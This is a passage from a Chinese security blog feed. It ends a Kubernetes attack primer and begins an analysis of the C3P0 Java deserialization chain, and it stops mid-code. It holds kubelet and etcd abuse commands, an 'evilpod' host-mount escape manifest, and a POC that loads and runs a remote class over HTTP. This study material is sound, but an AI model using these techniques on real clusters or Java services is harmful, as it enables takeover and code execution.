的鉴权时才使用此标志。</span><br></pre></td></tr></table></figure><p>在我们发现kubelet未授权后，可以进行以下操作拿到入口点</p><h4 id="执行Pod内命令"><a href="#执行Pod内命令" class="headerlink" title="执行Pod内命令"></a>执行Pod内命令</h4><p>如果有kubelet未授权，那就可以用以下命令在Pod内执行命令</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -XPOST -k https:<span class="comment">//node_ip:10250/run/&lt;namespace&gt;/&lt;PodName&gt;/&lt;containerName&gt; -d &quot;cmd=command&quot;</span></span><br></pre></td></tr></table></figure><p>其中的参数可以从<a href="https://node_ip:10250/pods">https://node_ip:10250/pods</a> 中获取</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021513.png"></p><p>可以直接回显命令结果，很方便</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021514.png"></p><h4 id="获取容器内service-account凭据"><a href="#获取容器内service-account凭据" class="headerlink" title="获取容器内service account凭据"></a>获取容器内service account凭据</h4><p>如果能在Pod内执行命令，那么就可以获取Pod里service account的凭据，使用Pod上的service account凭据可以用来模拟Pod上的服务账户进行操作，具体利用方法见下面的小节。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021515.png"></p><h3 id="etcd-未授权"><a href="#etcd-未授权" class="headerlink" title="etcd 未授权"></a>etcd 未授权</h3><p>etcd是k8s集群中的数据库组件，默认监听在2379端口，如果2379存在未授权，那么就可以通过etcd查询集群内管理员的token，然后用这个token访问api server接管集群。</p><p>etcd有v2和v3两个版本，k8s用的是v3版本，所以我们在访问etcd的时候需要用命令ETCDCTL_API=3来指定etcd版本。</p><p>我们想要利用etcd未授权，需要使用一个工具叫做etcdctl，它是用来管理etcd数据库的，我们可以在github上下载它</p><p><a href="https://github.com/etcd-io/etcd/releases/">https://github.com/etcd-io/etcd/releases/</a></p><p>“在启动etcd时，如果没有指定 –client-cert-auth 参数打开证书校验，并且没有通过iptables / 防火墙等实施访问控制，etcd的接口和数据就会直接暴露给外部黑客”——爱奇艺安全应急响应中心</p><p>复现环境我也懒得搭了，我们就在授权情况下来复现这个洞吧！（</p><p>首先，如果我们在没有证书文件的前提下直接访问2375端口，是调用不了etcd应用的,会提示X509证书错误。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ETCDCTL_API=<span class="number">3</span> ./etcdctl --endpoints=https:<span class="comment">//etcd_ip:2375/ get / --prefix --keys-only</span></span><br></pre></td></tr></table></figure><p>我们需要将以下文件加入环境变量才能访问（如果有未授权，那么不用带证书都能访问）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">export ETCDCTL_CERT=/etc/kubernetes/pki/etcd/peer.crt</span><br><span class="line">export ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crt</span><br><span class="line">export ETCDCTL_KEY=/etc/kubernetes/pki/etcd/peer.key</span><br></pre></td></tr></table></figure><h4 id="查询管理员token"><a href="#查询管理员token" class="headerlink" title="查询管理员token"></a>查询管理员token</h4><p>图片引用自爱奇艺安全应急响应中心</p><p>我们可以直接在etcd里查询管理员的token，然后使用该token配合kubectl指令接管集群。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">etcdctl --endpoints=https:<span class="comment">//etcd_ip:2375/ get / --prefix --keys-only | grep /secrets/</span></span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021517.png"></p><p>如果查询结果有敏感账户，我们便可以去获取他的token</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">etdctl --endpoints=https:<span class="comment">//etcd_ip:2375/ get /registry/secrets/default/admin-token-55712</span></span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021516.png"></p><p>拿到token以后，用kubectl接管集群</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kubectl --insecure-skip-tls-verify -s https:<span class="comment">//master_ip:6443/ --token=&quot;xxxxxx&quot; get nodes</span></span><br></pre></td></tr></table></figure><h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><h3 id="目录挂载逃逸"><a href="#目录挂载逃逸" class="headerlink" title="*目录挂载逃逸"></a>*目录挂载逃逸</h3><p>这个技术是综合了执行、持久化、权限提升的一个攻击方法，为了省事，就放在这里一块说了。</p><p>首先，在我们获取了api server控制权后，我们可以创建Pod，并在容Pod内部执行命令。如果我们在创建Pod时，将Node节点的根目录挂载到Pod的某个目录下，由于我们能在Pod内部执行命令，所以我们可以修改挂载到Pod下的Node节点根目录中文件的内容，如果我们写入恶意crontab、web shell、ssh公钥，便可以从Pod逃逸到宿主机Node，获取Node控制权。</p><p>具体复现如下</p><p>先创建一个恶意Pod</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">首先我们创建恶意Pod，可以直接创建Pod，也可以用Deployment创建。</span><br><span class="line">既然提到创建Pod，那么就多提一句：直接创建Pod和用Deployment创建Pod的区别是什么？</span><br><span class="line"></span><br><span class="line">Deployment可以更方便的设置Pod的数量，方便Pod水平扩展。</span><br><span class="line">Deployment拥有更加灵活强大的升级、回滚功能,并且支持滚动更新。</span><br><span class="line">使用Deployment升级Pod只需要定义Pod的最终状态，k8s会为你执行必要的操作。</span><br><span class="line"></span><br><span class="line">如果创建一个小玩意，那么直接创建Pod就行了，没必要用deployment。</span><br><span class="line">_______________________________________</span><br><span class="line">用Pod创建</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: evilpod</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - image: nginx</span><br><span class="line">    name: container</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - mountPath: /mnt</span><br><span class="line">      name: test-volume</span><br><span class="line">  volumes:</span><br><span class="line">  - name: test-volume</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /</span><br><span class="line">      </span><br><span class="line">__________________________________</span><br><span class="line">用deployment创建</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-deployment</span><br><span class="line">  labels:</span><br><span class="line">    app: nginx-test</span><br><span class="line">spec:</span><br><span class="line">  replicas: <span class="number">1</span></span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: nginx</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: nginx</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - image: nginx</span><br><span class="line">        name: container</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - mountPath: /mnt</span><br><span class="line">          name: test-volume</span><br><span class="line">      volumes:</span><br><span class="line">      - name: test-volume</span><br><span class="line">        hostPath:</span><br><span class="line">          path: /</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将以上文本写入到一个yaml文件中，然后执行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kubectl apply -f xxxxx.yaml</span><br><span class="line">如果是api server未授权打进去的，可能要通过-s参数设置一下api server的ip和地址：kubectl -s http:<span class="comment">//master_ip:8080 command</span></span><br><span class="line"></span><br><span class="line">这里再多嘴一句 kubectl apply 和 kubectl create 这两个命令的区别</span><br><span class="line">两个命令都可以用于创建pod，apply更倾向于”维护资源“，可以用于更新已有Pod；而create更倾向于”直接创建“，不管三七二十一给我创建就完事了</span><br><span class="line">简而言之，当一个资源已经存在时，用create会报错，而apply不会报错</span><br><span class="line">——————ref:https:<span class="comment">//stackoverflow.com/questions/47369351/kubectl-apply-vs-kubectl-create</span></span><br></pre></td></tr></table></figure><p>恶意容器就创建好了</p><p>创建好了后使用命令 kubectl get pods 获取恶意pod的名字</p><p>然后使用命令 kubectl exec -it evilpodname /bin/bash 进入pod内部shell，然后向挂载到Pod内部的Node根目录中写入恶意crontab、ssh公钥、webshell即可拿到node的shell。</p><p>大致流程一张图表示如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220311115842.png" alt="image-20220311115835649"></p><h3 id="利用Service-Account连接API-Server执行指令"><a href="#利用Service-Account连接API-Server执行指令" class="headerlink" title="利用Service Account连接API Server执行指令"></a>利用Service Account连接API Server执行指令</h3><p>k8s有两种账户：用户账户和服务账户，用户账户被用于人与集群交互（如管理员管理集群），服务账户用于Pod与集群交互（如Pod调用api server提供的一些API进行一些活动）</p><p>如果我们入侵了一台有着高权限服务账户的Pod，我们就可以用它对应的服务账户身份调用api server向集群下达命令。<br>pod的serviceaccount信息一般存放于/var/run/secrets/kubernetes.io/serviceaccount/目录下</p><p>但是默认的user或者service account并不具备任何权限</p><p>这是默认情况下，一个pod使用自身service account(默认为当前命名空间的default账户)去请求api server返回的结果，可以发现是没有权限的。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ CA_CERT=/<span class="keyword">var</span>/run/secrets/kubernetes.io/serviceaccount/ca.crt</span><br><span class="line">$ TOKEN=$(cat /<span class="keyword">var</span>/run/secrets/kubernetes.io/serviceaccount/token)</span><br><span class="line">$ NAMESPACE=$(cat /<span class="keyword">var</span>/run/secrets/kubernetes.io/serviceaccount/namespace)</span><br><span class="line">$ curl --cacert $CA_CERT -H <span class="string">&quot;Authorization: Bearer $TOKEN&quot;</span> <span class="string">&quot;https://192.168.111.20:6443/version/&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;Status&quot;</span>,</span><br><span class="line">  <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;metadata&quot;</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">&quot;status&quot;</span>: <span class="string">&quot;Failure&quot;</span>,</span><br><span class="line">  <span class="string">&quot;message&quot;</span>: <span class="string">&quot;version is forbidden: User \&quot;system:serviceaccount:default:default\&quot; cannot list resource \&quot;version\&quot; in API group \&quot;\&quot; at the cluster scope&quot;</span>,</span><br><span class="line">  <span class="string">&quot;reason&quot;</span>: <span class="string">&quot;Forbidden&quot;</span>,</span><br><span class="line">  <span class="string">&quot;details&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;version&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;code&quot;</span>: <span class="number">403</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么我现在创建一个高权限service account 并使其与一个Pod相关联，来复现一下这个攻击手法</p><p>首先创建一个高权限service account </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kubectl create serviceaccount niubi #创建service account：niubi</span><br><span class="line">kubectl create clusterrolebinding cluster-admin-niubi  --clusterrole=cluster-admin --serviceaccount=default:niubi #把niubi放入集群管理员组，相当于给了它高权限</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后将service account与pod相关联</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">在创建Pod的yaml文件中的spec项中输入 serviceAccountName: niubi</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220311115857.png" alt="image-20220311115857358"></p><p>再试一下，发现可以调用api server了</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220311115913.png" alt="image-20220311115913661"></p><h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><p>这里的持久化是指如何在Pod中持久化、如何在Node中持久化、如何在集群中持久化。<br>如何在Node中持久化，在上一小节中已经提到过一些：通过写入crontab，ssh公钥，webshell实现，但个人觉得这几个手段与其说是持久化，不如说是权限提升更符合实际一点，因为这几个手段在实际渗透中都是为了从Pod逃逸出来获取Node权限。</p><p>同时，在Pod，Node，Master上做持久化，有大部分方法本质上是“如何在linux机器上做持久化”，而“如何在linux机器上做持久化”方法就太多了，这里就只着重于讲述在“云环境”里独有的持久化方法。</p><h4 id="在私有镜像库中植入后门（Pod持久化）"><a href="#在私有镜像库中植入后门（Pod持久化）" class="headerlink" title="在私有镜像库中植入后门（Pod持久化）"></a>在私有镜像库中植入后门（Pod持久化）</h4><p>如果接管了对方的私有镜像库，我们便可以直接在其对象Dockerfile中塞入恶意指令（反弹shell等）<br>或者编辑镜像的文件层代码，将镜像中原始的可执行文件或链接库文件替换为精心构造的后门文件之后再次打包成新的镜像。</p><h4 id="修改核心组件访问权限（集群持久化）"><a href="#修改核心组件访问权限（集群持久化）" class="headerlink" title="修改核心组件访问权限（集群持久化）"></a>修改核心组件访问权限（集群持久化）</h4><p>包括且不限于 更改配置暴露apiserver 8080端口、暴露docker.sock、暴露未授权etcd、暴露未授权kubelet等修改集群配置文件达到持久化的方法。</p><h4 id="shadow-api-server（集群持久化-cdk工具利用）"><a href="#shadow-api-server（集群持久化-cdk工具利用）" class="headerlink" title="shadow api server（集群持久化/cdk工具利用）"></a>shadow api server（集群持久化/cdk工具利用）</h4><p>部署一个额外的未授权且不记录日志的api server以供我们进行持久化。</p><p>我们可以用github上专门用于k8s渗透的工具cdk（这个工具很屌）来做到这一点</p><p><a href="https://github.com/cdk-team/CDK/wiki/CDK-Home-CN">https://github.com/cdk-team/CDK/wiki/CDK-Home-CN</a></p><p><a href="https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver">https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver</a></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>指从pod拿到Node的shell，或者拿到集群控制权。</p><p>上面的小节提到过一些，比如kubectl未授权、docker.sock、挂载目录、高权限Service account等方法。</p><p>除此之外还有Docker、k8s的一些CVE</p><p>Docker逃逸如CVE-2019-5736，CVE-2019-14271,CVE-2020-15257</p><p>k8s提权到接管集群的如CVE-2018-1002105,CVE-2020-8558</p><h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><h3 id="是否在容器环境中"><a href="#是否在容器环境中" class="headerlink" title="是否在容器环境中"></a>是否在容器环境中</h3><ul><li>根目录下/.dockerenv 文件存在即docker环境</li><li>/proc/1/cgroup 内若包含docker或kube字符串则是在docker环境或k8s pod 之中</li></ul><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220311115944.png" alt="image-20220311115944024"></p><ul><li>没有常见命令</li></ul><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021522.png"></p><ul><li>查看环境变量中是否有k8s或者docker字符串</li></ul><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021524.png"></p><ul><li>查看端口开放情况（netstat -anp），如果开放了一些特殊端口如6443、8080（api server）,2379（etcd）,10250、10255（kubelet），10256（kube-proxy） 那么可以初步判定为是在k8s环境中的一台Node或者master，这个方法亦可用于端口扫描探测目标主机是否为k8s集群中的机器</li><li>查看当前网段，k8s中 Flannel网络插件默认使用10.244.0.0/16网络，Calico默认使用192.168.0.0/16网络，如果出现在这些网段中（特别是10.244网段）那么可以初步判断为集群中的一个pod。pod里面没有命令很少，可以通过hostname -I(大写i)来查看ip地址</li></ul><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021523.png"></p><h1 id="0x04-ref"><a href="#0x04-ref" class="headerlink" title="#0x04 ref"></a>#0x04 ref</h1><p><a href="https://developer.aliyun.com/article/765449#slide-5">https://developer.aliyun.com/article/765449#slide-5</a></p><p><a href="https://xz.aliyun.com/t/4276#toc-4">https://xz.aliyun.com/t/4276#toc-4</a></p><p><a href="https://tttang.com/archive/1389/">https://tttang.com/archive/1389/</a></p><p><a href="https://payloads.online/archivers/2021-07-20/1/">https://payloads.online/archivers/2021-07-20/1/</a></p><p><a href="https://www.freebuf.com/articles/database/316788.html">https://www.freebuf.com/articles/database/316788.html</a></p><p><a href="https://www.freebuf.com/vuls/196993.html">https://www.freebuf.com/vuls/196993.html</a></p><p><a href="https://github.com/pen4uin/cloud-native-security">https://github.com/pen4uin/cloud-native-security</a></p><p><a href="https://www.updateweb.cn/zwfec/item-367.html">https://www.updateweb.cn/zwfec/item-367.html</a></p><p><a href="https://kuboard.cn/learning/">https://kuboard.cn/learning/</a>(非常好的中文教程)</p><p><a href="https://kubernetes.io/zh/docs/tutorials/kubernetes-basics/">https://kubernetes.io/zh/docs/tutorials/kubernetes-basics/</a>(k8s官方教程，有交互式操作界面，稍微有点不好的是有些地方没有中文)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;k8s安全-入门学习&quot;&gt;&lt;a href=&quot;#k8s安全-入门学习&quot; class=&quot;headerlink&quot; title=&quot;k8s安全 入门学习&quot;&gt;&lt;/a&gt;k8s安全 入门学习&lt;/h1&gt;&lt;h1 id=&quot;0x01云&quot;&gt;&lt;a href=&quot;#0x01云&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="云相关" scheme="http://const27.com/tags/%E4%BA%91%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>浅析C3P0链</title>
    <link href="http://const27.com/2022/03/02/C3P0%E9%93%BE/"/>
    <id>http://const27.com/2022/03/02/C3P0%E9%93%BE/</id>
    <published>2022-03-01T17:47:44.617Z</published>
    <updated>2022-03-01T17:47:59.156Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C3P0链"><a href="#C3P0链" class="headerlink" title="C3P0链"></a>C3P0链</h1><h1 id="C3P0？"><a href="#C3P0？" class="headerlink" title="C3P0？"></a>C3P0？</h1><p>C3P0是JDBC的一个连接池组件</p><p>JDBC:</p><blockquote><p>“JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。<br>使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。”</p></blockquote><p>连接池：</p><blockquote><p>“我们在讲多线程的时候说过，创建线程是一个昂贵的操作，如果有大量的小任务需要执行，并且频繁地创建和销毁线程，实际上会消耗大量的系统资源，往往创建和消耗线程所耗费的时间比执行任务的时间还长，所以，为了提高效率，可以用线程池。<br>类似的，在执行JDBC的增删改查的操作时，如果每一次操作都来一次打开连接，操作，关闭连接，那么创建和销毁JDBC连接的开销就太大了。为了避免频繁地创建和销毁JDBC连接，我们可以通过连接池（Connection Pool）复用已经创建好的连接。”</p></blockquote><p>C3P0：</p><blockquote><p><strong>C3P0是</strong>一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。 使用它的开源项目有Hibernate、Spring等。</p></blockquote><h1 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h1><p>C3P0链的相关依赖及版本，从ysoserial中可以看到</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">C3P0                <span class="meta">@mbechler</span>                              c3p0:<span class="number">0.9</span><span class="number">.5</span><span class="number">.2</span>, mchange-commons-java:<span class="number">0.2</span><span class="number">.11</span></span><br></pre></td></tr></table></figure><p>pom.xml，maven中添加此组件会自动加载mchange-commons-java这个包</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.mchange&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;c3p0&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;0.9.5.2&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p>这条链在许多文章中也被称为http base链。</p><p>在PoolBackedDataSourceBase类（抽象类）的writeObject方法中有如下内容</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220225164843.png"></p><p>该方法会尝试将当前对象的connectionPoolDataSource属性进行序列化，如果不能序列化便会在catch块中对connectionPoolDataSource属性用ReferenceIndirector.indirectForm方法处理后再进行序列化操作。我们跟进ReferenceIndirector.indirectForm方法。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_1.png"></p><p>此方法会调用connectionPoolDataSource属性的getReference方法，并用返回结果作为参数实例化一个ReferenceSerialized对象，然后将ReferenceSerialized对象返回，ReferenceSerialized被序列化。<br>下图是ReferenceSerialized构造方法，结合上文可以发现，其reference对象是人为可控的。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_2.png"></p><p>尽然说到了PoolBackedDataSourceBase的writeObject方法，有序列化肯定就有反序列化，那自然而然到PoolBackedDataSourceBase的readObject方法看看。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_3.png"></p><p>可以看到会调用序列流中的对象的getObject方法，结合上文，如果ReferenceSerialized被序列化到了序列流中，那么这里可以是ReferenceSerialized#getObject，我们进行跟进。<br>跟进后可以发现调用了ReferenceableUtils.referenceToObject这个静态方法，再度进行跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_4.png"></p><p>由于ref是在序列化的时候可以控制的参数，那么fClassName自然也是可以控制的属性。<br>结合下图黄框中的内容不难发现，我们可以通过URLClassLoader实例化远程类，造成任意代码执行。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_5.png"></p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.naming.ReferenceIndirector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">c3p</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        PoolBackedDataSourceBase a = <span class="keyword">new</span> PoolBackedDataSourceBase(<span class="keyword">false</span>);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&quot;</span>);</span><br><span class="line">        Field f1 = clazz.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>); <span class="comment">//此类是PoolBackedDataSourceBase抽象类的实现</span></span><br><span class="line">        f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f1.set(a,<span class="keyword">new</span> evil());</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream ser = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">&quot;a.bin&quot;</span>)));</span><br><span class="line">        ser.writeObject(a);</span><br><span class="line">        ser.close();</span><br><span class="line">        ObjectInputStream unser = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;a.bin&quot;</span>));</span><br><span class="line">        unser.readObject();</span><br><span class="line">        unser.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span> <span class="keyword">implements</span> <span class="title">ConnectionPoolDataSource</span>, <span class="title">Referenceable</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PrintWriter <span class="title">getLogWriter</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLogWriter</span> <span class="params">( PrintWriter out )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLoginTimeout</span> <span class="params">( <span class="keyword">int</span> seconds )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLoginTimeout</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Logger <span class="title">getParentLogger</span> <span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">( String user, String password )</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Reference(<span class="string">&quot;evilexp&quot;</span>,<span class="string">&quot;evilexp&quot;</span>,<span class="string">&quot;http://127.0.0.1:10099/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evilexp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">evilexp</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_6.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_7.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>PoolBackedDataSource在序列化时可以序列化入一个任意Reference类，在PoolBackedDataSource反序列化时该Reference类中指定的对象会被URLClassLoader远程加载实例化。</p><h3 id="hex-base"><a href="#hex-base" class="headerlink" title="hex base"></a>hex base</h3><p>如果不出网，而且是fastjson或jackson的情况，可以用这个Gadget。</p><p>WrapperConnectionPoolDataSourceBase有属性userOverridesAsString及其setter方法setuserOverridesAsString。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_8.png"></p><p>这里可以联想到 接下来可能会调用与userOverridesAsString相关方法<br>可以尝试着写个main函数调用一下setuserOverridesAsString方法，然后在parseUserOverridesAsString打个断点试试，断点命中。<br>为什么在parseUserOverridesAsString打断点呢，因为这个方法中有与反序列化操作相关的字眼（黄框中）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    a.setUserOverridesAsString(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_9.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_10.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_11.png"></p><p>parseUserOverridesAsString会先把userOverrideAsString属性进行截取（也就是上图中userOverrideAsString属性中HexAsciiSerializedMap后面的部分），然后将其视为十六进制数据转化成byte，然后调用SerializableUtils.fromByteArray对其进行处理</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_12.png"></p><p>SerializableUtils.fromByteArray会对byte进行反序列化处理。</p><p>在fastjson，jackson等环镜下，userOverridesAsString属性可控，导致可以从其setter方法setuserOverridesAsString开始到最后deserializeFromByteArray对其调用readObject进行反序列化，造成反序列化漏洞。</p><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><p>用cc2链打的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> 